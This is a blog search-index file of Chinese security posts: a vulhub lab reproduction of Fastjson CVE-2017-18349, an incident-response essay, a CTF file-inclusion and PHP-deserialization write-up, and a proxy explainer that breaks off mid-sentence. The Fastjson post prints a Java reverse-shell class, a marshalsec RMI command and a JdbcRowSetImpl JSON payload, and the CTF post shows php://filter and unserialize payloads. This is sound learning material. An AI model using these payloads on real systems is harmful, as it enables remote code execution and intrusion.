<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>【网络安全系列】程序分析学习笔记</title>
    <link href="/%E3%80%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E3%80%91%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/%E3%80%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E3%80%91%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>前几天面试阿里的 SDL 部门，面试小姐姐人非常好。大致给我讲了里面工作的大致分类。</p><ul><li>白盒审计：</li><li>黑盒测试</li></ul><p>我也基本确定了自己的发展方向，CTF 的内容也偏向于这方面，以后的主要学习内容都尽量偏向于这两个方向。</p><blockquote><p>我深知，技术是为了解决问题而生，各种各样的技术会不断进步，永远是学不完的。我需要积淀自己的核心能力。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>网络空间安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>污点分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【网络安全系列】CVE-2017-18349：Fastjson 任意代码执行</title>
    <link href="/2021%E5%B9%B43%E6%9C%884%E6%97%A5-%E3%80%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E3%80%91CVE-2017-18349%EF%BC%9AFastjson-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <url>/2021%E5%B9%B43%E6%9C%884%E6%97%A5-%E3%80%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E3%80%91CVE-2017-18349%EF%BC%9AFastjson-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>Fastjson 是一个阿里巴巴的开源 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p><h1 id="0x02-漏洞概述"><a href="#0x02-漏洞概述" class="headerlink" title="0x02 漏洞概述"></a>0x02 漏洞概述</h1><p><strong>编号：CVE-2017-18349</strong></p><p>Fastjson 提供了 autotype 功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，其次，Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法，那么当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。并且在Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启autotype功能的绕过。</p><h1 id="0x03-影响版本"><a href="#0x03-影响版本" class="headerlink" title="0x03 影响版本"></a>0x03 影响版本</h1><p>Fastjson1.2.47以及之前的所有版本</p><h1 id="0x04-环境搭建"><a href="#0x04-环境搭建" class="headerlink" title="0x04 环境搭建"></a>0x04 环境搭建</h1><ol><li><p>启动环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 下载 vulhub</span><br>git clone https://github.com/vulhub/vulhub.git<br><span class="hljs-meta">#</span><span class="bash"> 启动</span><br>cd vulhub/fastjson/1.2.47-rce<br>docker-compose up -d<br></code></pre></td></tr></table></figure></li><li><p>判断是否正常启动。访问<code>http://127.0.0.1:8090</code>，会返回一个 Json 串，如下图所示：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210304172714.png"></p></li></ol><h1 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h1><blockquote><p>主机IP：172.18.0.1</p><p>靶机IP：172.18.0.2</p></blockquote><ol><li><font color="red">编译反弹 shell 恶意代码</font><blockquote><p>注意⚠️：将本地的 JDK 切换到 <code>openjdk:8u102</code></p></blockquote></li></ol><p>创建恶意代码 <code>Exploit.java</code> 文件，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span> </span>&#123;<br><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Exploit</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      Runtime<br>        .getRuntime()<br>        .exec(<br>          <span class="hljs-string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/172.18.0.1/9876 0&gt;&amp;1&quot;</span><br>        );<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>      e.printStackTrace();<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] argv)</span> </span>&#123;<br>    Exploit e = <span class="hljs-keyword">new</span> Exploit();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用 <code>javac Exploit.java</code> 进行编译。(记得修改上面的为自己的主机 ip 地址)</p><ol start="2"><li><font color="red">搭建 Web 服务，让<strong>目标靶机</strong>可以访问。</font></li></ol><p>在 class 路径下执行 <code>python3 -m http.server 8081</code> 即可。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210305130108.png"></p><ol start="3"><li><font color="red">使用 marshalsec 搭建 RMI（Remote Method Invoke）环境.在 java 反序列化时，利用序列化数据造成代码执行攻击。</font></li></ol><p>先编译 marshalsec</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><br>git <span class="hljs-built_in">clone</span> https://github.com/mbechler/marshalsec.git<br><span class="hljs-built_in">cd</span> marshalsec <br>mvn clean package -DskipTests <span class="hljs-comment"># 使用 maven 编译</span><br><br></code></pre></td></tr></table></figure><p>编译后进入 <code>target</code> 目录，并使用下面的命令启动 RMI 服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://172.18.0.1:8081/#Exploit&quot;</span> 9999<br></code></pre></td></tr></table></figure><blockquote><p>这里的 URL <code>http://172.18.0.1:8081/#Exploit</code> 有几个关键的要素：</p><ol><li>目标靶机可以访问到 IP 地址（我的主机地址为 <code>172.18.0.1</code>，我的靶机地址为 <code>172.18.0.2</code>，在同一个内网中）。除非 Fastjson 搭建在本地环境，否则不要使用 <code>127.0.0.1</code></li><li>Web 服务下载 Exploit.class 的 URL 为 <code>http://172.18.0.1:8081/Exploit.class</code>，在命令行中需要改写为 <code>http://172.18.0.1:8081/#Exploit</code></li></ol></blockquote><ol start="4"><li><font color="red">使用 Burpsuite 修改 GET 为 POST，并发送 exp。</font></li></ol><p>exp:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br><br>    <span class="hljs-attr">&quot;a&quot;</span>:&#123;<br><br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br><br>        <span class="hljs-attr">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><br>    &#125;,<br><br>    <span class="hljs-attr">&quot;b&quot;</span>:&#123;<br><br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br><br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://172.18.0.1:9999/Exploit&quot;</span>,<br><br>        <span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>Burpsuite具体配置如下：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210305133216.png"></p><p>在 VPS 中使用命令 <code>nc -lvp 9876</code> 来接收反弹的 shell，然后在 Burp 发送数据包，发送后能观察到 RMI 服务和 Web 服务都被靶机访问。（说明发送过程没问题，如果没有看到下面的结果，需要检查一下 IP 和端口设置）</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210305133353.png"></p><p>成功 GET shell<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210305134426.png"></p><p>整体流程图：</p><h1 id="0x06-漏洞分析"><a href="#0x06-漏洞分析" class="headerlink" title="0x06 漏洞分析"></a>0x06 漏洞分析</h1><h1 id="0x07-修复方式"><a href="#0x07-修复方式" class="headerlink" title="0x07 修复方式"></a>0x07 修复方式</h1><h1 id="0x08-坑"><a href="#0x08-坑" class="headerlink" title="0x08 坑"></a>0x08 坑</h1><ol><li></li><li>编译恶意代码时，需要 Java 8。</li></ol><p>参考教程：</p><ol><li><a href="https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">fastjson反序列化漏洞复现</a></li><li></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【网络安全系列】浅谈应急响应</title>
    <link href="/2021%E5%B9%B43%E6%9C%883%E6%97%A5-%E3%80%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E3%80%91%E6%B5%85%E8%B0%88%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <url>/2021%E5%B9%B43%E6%9C%883%E6%97%A5-%E3%80%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E3%80%91%E6%B5%85%E8%B0%88%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    
    <content type="html"><![CDATA[<p>应急响应包含组织为了应对突发/重大信息安全事件的发生所做的准备，以及在事件发生后所采取的措施。，是信息安全从业者的常见工作之一。应急响应并非仅仅是在系统被黑之后做一系列的补救措施，而是需要在平时就进行被黑的准备和避免被黑。</p><p>各大厂商通常的做法就是成立应急响应中心 SRC（Security Response Center），来尽量避免被黑。</p><hr><h1 id="1-Why？"><a href="#1-Why？" class="headerlink" title="1 Why？"></a>1 Why？</h1><p><font color="red">问1:为什么需要应急响应流程？</font></p><p>需要了解为什么需要应急响应，那就需要从应急响应的目的入手：尽可能保证网站系统的安全。</p><p>如果网站厂商不具备网站基本的保护能力，即基本的入侵检测能力，平时检测不到入侵事件，有可能被入侵成功很久了却浑然不知，攻击者可能早就在达成目标后，清理痕迹悄然离去了，然后就被爆出新闻《xxx公司xx万个人隐私信息流入暗网售卖》，紧接着股票下跌，一系列指责……</p><p>（开发人员的重心都处在开发任务，他们的任务是开发新功能并保证系统的正常运行，并不保障是否安全。）</p><p>如果具备应急响应能力，平时可以对流量进行监控，对异常流量及时拦截，溯源分析流量来源，将心怀不轨之人绳之以法。</p><p>原因便浮出水面：尽可能保证网站系统的安全，减少公司因恶意攻击而收到的损失。</p><p><font color="red">问2:为什么需要应急响应中心（SRC）？</font></p><p>大型企业涉及的产品众多，攻击面广，漏洞被外部发现难以避免。如果被无意或善意的人发现了，应该如何接收这些漏洞呢？</p><p>（这让我想到了漏洞贩卖，据说 0 day 的买卖是合法交易，不卖留着砸手里？狗头</p><p>互联网工作组的“<a href="https://tools.ietf.org/html/draft-christey-wysopal-vuln-disclosure-00">负责任的漏洞披露过程</a>”是一个广泛被业界采纳的做法。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210303045932.png"></p><p>具体做法被分为两种模式：</p><ol><li>微软模式：公告。也有赏金计划。</li><li>谷歌模式：公告+赏金。</li></ol><p>腾讯：送公仔-&gt;排行榜-&gt;兑换。</p><p>也就是说安全应急响应中心是对自己安全团队所做的安全保障工作的补充，减小入侵事件发生的概率。</p><h1 id="2-What？"><a href="#2-What？" class="headerlink" title="2 What？"></a>2 What？</h1><p><font color="red">问1:应急响应需要做什么？</font></p><p>应急响应有一个被广泛接受的方法论（也就是最佳实践）——PDCERF 模型，这个模型提供了应急响应的大体思路。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210303031941.png"></p><ol><li>准备阶段：将 PDCERF 中可能会使用到的工具、知识、技能进行提前准备，为后面的流程节约时间。</li><li>检测阶段：目的是确认入侵事件是否发生。常见的漏洞通过分析日志即可，而病毒需要进行进一步的分析。病毒本身必然有网络行为，内存必然有其二进制代码，它要么是单独的进程模块，要么是进程的dll/so模块，通常，为了保活，它极可能还有自己的启动项、网络心跳包。</li><li>遏制阶段：目的是控制事件影响范围，避免黑客在内网中进一步扩大攻击面。</li><li>根除阶段：目的是避免黑客再度侵入。</li><li>恢复阶段：目的是恢复业务的连续性。</li><li>跟踪总结阶段:目的是思考安全事件的根本原因，优化安全策略.</li></ol><h1 id="3-How？"><a href="#3-How？" class="headerlink" title="3 How？"></a>3 How？</h1><p><font color="red">问1:需要做什么？</font></p><p>没有具体的实战经验，以后有实战经验之后再来补充吧。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/2021%E5%B9%B43%E6%9C%88-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.png"></p><p>参考文章：</p><ol><li><a href="https://zhuanlan.zhihu.com/p/43437121">应急响应浅谈</a></li><li><a href="https://security.tencent.com/index.php/blog/msg/84">企业安全应急响应中心建设理论与实践</a></li><li><a href="https://www.secrss.com/articles/7374">应急响应的整体思路和基本流程</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>网络空间安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【CTF系列】攻防世界-nizhuansiwei</title>
    <link href="/2021%E5%B9%B43%E6%9C%882%E6%97%A5-%E3%80%90CTF%E7%B3%BB%E5%88%97%E3%80%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-nizhuansiwei/"/>
    <url>/2021%E5%B9%B43%E6%9C%882%E6%97%A5-%E3%80%90CTF%E7%B3%BB%E5%88%97%E3%80%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-nizhuansiwei/</url>
    
    <content type="html"><![CDATA[<p>相关信息:</p><blockquote><p>hint：无</p></blockquote><p>进入网站后，便能显示源码，是一道代码审计题目。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span>  <br>$text = $_GET[<span class="hljs-string">&quot;text&quot;</span>];<br>$file = $_GET[<span class="hljs-string">&quot;file&quot;</span>];<br>$password = $_GET[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-comment">// text 需要等于 welcome</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br><span class="hljs-comment">// 文件名中不能包含 flag</span><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,$file))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-comment">// 可能需要读取 useless.php</span><br>        <span class="hljs-keyword">include</span>($file);  <span class="hljs-comment">//useless.php</span><br><span class="hljs-comment">// php 反序列化</span><br>        $password = unserialize($password);<br>        <span class="hljs-keyword">echo</span> $password;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>我在源码中写了一些关键信息。</p><p>我还收集了一些其他信息</p><blockquote><ul><li>服务器信息</li><li>网站路径（有些题目不扫路径确实做不出来）</li></ul></blockquote><p>网站使用 PHP 和 Apache 搭建，并没有 Cookie。Web 路径如下：</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302122549.png"></p><p>（图片说明：访问 flag.php 并没有 flag）</p><hr><h1 id="1-file-get-content"><a href="#1-file-get-content" class="headerlink" title="1 file_get_content"></a>1 file_get_content</h1><p>第一步，我们需要将变量 text 赋值为 <code>welcome to the zjctf</code>，我们需要使用到 file_get_content 读取网页的功能<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302133315.png"></p><p>首先尝试 data 协议，如果 data 协议可以实现，那么 php://input 也应该可以实现。</p><blockquote><p>构造后的 URL：<a href="http://111.200.241.244:45370/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=">http://111.200.241.244:45370/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</a><br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302133500.png"></p></blockquote><p>再尝试使用 php://input 实现</p><blockquote><p>PS: Hackbar 发送 POST 必须要含等号，否则无数据。（满满都是心酸泪<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302133604.png"></p></blockquote><hr><h1 id="2-include"><a href="#2-include" class="headerlink" title="2 include"></a>2 include</h1><p>通过第一步的测试，我们可以正常一些配置信息如下：</p><blockquote><ol><li>allow_url_include:on</li><li>allow_url_fopen:on</li></ol></blockquote><p>第二步就是利用 include 尝试读取源码注释的文件名（useless.php）。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302134719.png"></p><p>所以这里我们采用 php://filter 伪协议来读取。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302134942.png"></p><p>使用 base64 脚本解码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//读取文件流</span><br>$fileData = file_get_contents(<span class="hljs-string">&quot;1.txt&quot;</span>);<br><span class="hljs-comment">//将文件写入本地</span><br>file_put_contents(<span class="hljs-string">&quot;useless.php&quot;</span>, base64_decode($fileData));<br></code></pre></td></tr></table></figure><p>解码后的源码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span><br><span class="hljs-class"></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> $file;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file)) &#123;<br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="3-反序列化"><a href="#3-反序列化" class="headerlink" title="3 反序列化"></a>3 反序列化</h1><p>在 useless.php 中的注释，是在暗示 flag 位于 flag.php 文件中，我们将 file 改为 flag.php 即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span><br><span class="hljs-class"></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> $file = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>&#125;<br><br>$obj = <span class="hljs-keyword">new</span> Flag();<br><span class="hljs-keyword">echo</span> urlencode(serialize($obj));<br><br></code></pre></td></tr></table></figure><p>将 file 改为 php，让 include 执行 useless.php，从而引入 Flag 类，最后访问即可得到 flag（代码在源码中）<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302135514.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
      <tag>PHP反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机基础2：正向代理和反向代理的区别是什么？</title>
    <link href="/2021%E5%B9%B42%E6%9C%8828%E6%97%A5-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%802%EF%BC%9A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%9C%89%E5%93%AA%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9F/"/>
    <url>/2021%E5%B9%B42%E6%9C%8828%E6%97%A5-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%802%EF%BC%9A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%9C%89%E5%93%AA%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<blockquote><p>题目来源：<a href="https://whale3070.github.io/interview/2020/05/19/11-x">https://whale3070.github.io/interview/2020/05/19/11-x</a></p></blockquote><p>正向代理是为了帮助客户端访问其无法访问（有阻碍，如 WAF 或者内网）的服务器资源而产生的技术，在程序员中被广泛使用。例如：科学上网、VPN。</p><p>反向代理是为了替服务器收发请求而产生的技术。由代理服务器接收消息，在把消息分给其他服务器（可能背后有几百台）。这样做有很多好处，比如：</p><ol><li>保护真实服务器的安全；</li><li>减少单台服务器的压力（负载均衡）；</li></ol><p>nginx 实现了 HTTP 请求的反向代理。</p><p>类似上一个题目，提出关键问题，并逐一解答</p><h1 id="1-Why？"><a href="#1-Why？" class="headerlink" title="1 Why？"></a>1 Why？</h1><p><font color="red">问1:为什么面试官要问这个问题？</font></p><p>考察对于网站架构及基本原理的熟悉程度。我虽然有一点网站开发的经验，但是没探究过这方面的原理，可以稍微补充一下。</p><blockquote><p>参考文章：<a href="https://www.cnblogs.com/cangqinglang/p/10766181.html">传送门</a>，推荐阅读一下，讲得非常通熟易懂。</p></blockquote><p><font color="orange">阶段1:单机构建网站</font></p><p>刚学习网站开发基本都是这样的单机结构，也就是将应用服务器、数据库全部放在一台机器上，能完成基本的网络服务。</p><p>常见的应用服务器：</p><ul><li>Apache</li><li>Tomcat</li><li>Nginx</li><li>Jetty<blockquote><p>应用服务器又叫做 HTTP 服务器。本质上也是一种应用程序，通常运行在服务器之上，绑定服务器的 IP 地址并监听某一个 TCP 端口来接收并处理 HTTP 请求。</p></blockquote></li></ul><p>特点：把数据库和应用程序都在一台服务器中，用户较少，数据量较少。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302185013.png"></p><p>（图片说明：应用服务器和数据库处于单台机器）</p><p><font color="orange">阶段1:应用服务器与数据库分离</font></p><p>随着用户量的增大，为了减小单台服务器的压力，将数据的增删查改迁移到另一台服务器。</p><blockquote><p>为什么先应用服务器和数据库分离呢？</p><ul><li>简单：数据库和应用服务器之间通常都是通过地址的形式进行通信的，迁移数据库不需要很大的工作量（不用改太多的代码）。</li></ul></blockquote><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302185026.png"></p><p>（图片说明：应用服务器和数据库处于不同的机器）</p><p><font color="orange">阶段3:应用服务器集群</font></p><p>随着用户量的增大，假设数据库的读写服务器没有压力，而应用服务器的运算存在压力，那么要就考虑采用多台应用服务器来分担压力。这就需要一个管理人员，来给服务器分摊工作量。</p><p>常见的 nginx 高可用集群：Keepalived、LVS、nginx。</p><p>你可能会想，只用 nginx 分发应该就可以了吧？</p><blockquote><ul><li>如果只用 nginx，服务器宕机怎么办？解决方案：Keepalived 监控服务器状态。</li><li>如果只使用一台 nginx 分发，万一 nginx 也不够咋办？LVS 从传输层对数据包进行分发，分发给不同的 nginx。</li></ul></blockquote><p>参考文章：<a href="https://my.oschina.net/zhangxufeng/blog/3081423">传送门</a></p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302191858.png"></p><p>（图片说明：应用服务器增加，并添加负载均衡服务器来进行调度）</p><p><font color="orange">阶段4:数据库读写分离化</font></p><p>在上一个阶段解决了应用服务器的压力问题，那么随着流量的增大，数据库是最有可能出现瓶颈的地方。</p><p>数据库的读取和写入是两个相互不相关的功能，应该可以放在不同的服务器上实现吧？那怎么实现呢？主从复制，如下图所示。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210303224726.png"></p><p>（图片说明：数据库被分为主库和从库，主库写入，从库读取，主库和从库的数据使用工具保持同步）</p><p>从库不一定只有一台服务器，可以部署多台从服务器，和主服务器进行同步。这样就可以承担更大负荷的读取操作。</p><p>常见的解决方案：</p><ol><li>MySQL 自带的主从复制</li><li>MyCat 中间件<blockquote><p>这种中间件漏洞没搜到漏洞……</p></blockquote></li></ol><ul><li><font color="orange">阶段5:用搜索引擎缓解读库的压力</font></li><li><font color="orange">阶段6:用缓存缓解读库的压力</font></li><li><font color="orange">阶段7:数据库水平拆分与垂直拆分（数据过多）</font></li><li><font color="orange">阶段8:将应用按微服务拆分</font></li></ul><p>（注：后面的阶段都更偏向于性能拓展，需要时再学习）</p><p><font color="red">问2:学习网络安全为什么要学这个？</font></p><p>熟悉 Web 的结构，能帮助理解网站的全貌，更容易理解漏洞。</p><h1 id="2-What？"><a href="#2-What？" class="headerlink" title="2 What？"></a>2 What？</h1><p><font color="red">问1:这个问题的答案是什么？</font></p><p>正向代理和反向代理的根本区别：代理对象不同。正向代理为客户端服务，也就是客户端控制代理服务器的行为，客户端控制代理服务器访问另一个网段的不同服务器（为客户端服务）。反向代理为服务器服务，也就是服务器控制代理服务器的行为，服务器的负荷情况控制代理服务器将请求发送到不同的服务器（为服务器服务）。如下图所示。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a3eb881b758a44e6a554a59489d30b83.png"></p><p>（图片说明：Proxy 也需要与多个 Server 连接，所以关键还是看为谁而服务）</p><p><font color="red">问2:还有什么类似的题目？</font><br>暂时无</p><h1 id="花絮"><a href="#花絮" class="headerlink" title="花絮"></a>花絮</h1><p>本来第 2 